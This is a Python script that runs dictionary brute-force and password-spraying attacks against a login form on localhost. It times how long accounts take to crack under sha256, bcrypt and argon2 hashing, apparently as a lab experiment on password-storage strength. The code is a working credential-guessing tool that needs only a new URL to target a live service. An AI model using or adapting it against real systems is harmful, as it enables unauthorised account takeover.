import requests
import json
import time


LOGIN_URL = "http://127.0.0.1:5000/login"
PASSWORDS_FILE = "passwords.txt"
session = requests.Session()

def try_login(username, password, hashmode):
    try:
        response = session.post(
            LOGIN_URL,
            data={
                "username": username,
                "password": password,
                "hash_mode": hashmode
            },
            timeout=5
        )

        return ("Welcome" in response.text) or ("test" in response.url)

    except requests.RequestException as e:
        # Optional: log or handle transient network errors
        print(e)
        return False


def bruteforce(username, hashmode):
    count = 0
    with open(PASSWORDS_FILE, "r") as file:
        passwords = file.readlines()
        for line in passwords:
            line = line.rstrip("\n")
            if try_login(username, line, hashmode):
                return count
            count += 1
    #if not successful return flag
    return -1


def password_spraying(users, hashmode):
    successful_cracks = {}
    with open(PASSWORDS_FILE, "r") as file:
        passwords = file.readlines()
        for line in passwords:
            line = line.rstrip("\n")
            for user in users:
                if try_login(user, line, hashmode):
                    successful_cracks[user] = line
    return successful_cracks

def get_user_list():
    USERS_JSON = "users.json"
    user_list = []
    with open(USERS_JSON, "r") as f:
        data = json.load(f)
    for user in data['users']:
        user_list.append(user['username'])
    return user_list

def preform_bruteforce(hash):
    count = 0
    start = time.time()
    for user in get_user_list():
        global session
        session = requests.Session()
        user_start = time.time()
        tries = bruteforce(user,hash)
        user_end = time.time() - user_start
        print(f"Time elapsed {user_end}, for user {user}")
        if tries > 0:
            print(f"Successful after {tries} tries")
            count += tries
        else:
            print("Failed")
    end = time.time() - start
    return count, end
def main():
    hashmodes = ["sha256", "bcrypt", "argon2"]
    preform_bruteforce(hashmodes[0])
    #users = ["weak01","weak02","weak03","weak04","weak05"]
    # if bruteforce(get_user_list()[22], hashmodes[0]) > 0:
    #     print("Cracked")
    # else:
    #     print("Failed")
    # dic = password_spraying(users,hashmodes[0])
    # # print(dic)
    # print(get_user_list())




if __name__ == "__main__":
    main()
